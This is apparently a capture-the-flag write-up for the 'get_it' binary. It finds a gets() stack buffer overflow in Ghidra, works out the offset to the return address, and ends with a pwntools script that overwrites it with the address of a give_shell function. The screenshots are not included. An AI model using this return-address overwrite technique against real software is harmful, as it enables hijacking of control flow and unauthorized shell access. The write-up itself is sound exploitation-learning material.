![[get_it]]
### Recon

![[Pasted image 20240507230533.png]]
- disassemble application using ghidra![[Pasted image 20240507230605.png]]

-  we have another function ![[Pasted image 20240507230754.png]]
### Finding Vulnerability
- in 8th line ,vulnerable to BOF as the get function take input as much till EOF more than 32
-  we can change the RIP to give shell function by finding offset


### Finding Offset

- lets find where our input is stored in stack ![[Pasted image 20240507231257.png]]
- now find the address of the RIP ![[Pasted image 20240507231351.png]]
- now find the offset between input and RIP ![[Pasted image 20240507231428.png]]
### Payload
- now we have offset ,Lets find address of give shell function ![[Pasted image 20240507231607.png]]



```
from pwn import *

target = process("./get_it")
#gdb.attach(target, gdbscript = 'b *0x4005f1')

payload = ""
payload += "0"*40 # Padding to the return address
payload += p64(0x4005b6) # Address of give_shell in least endian, will be new saved return address

# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use the new shell
target.interactive()

```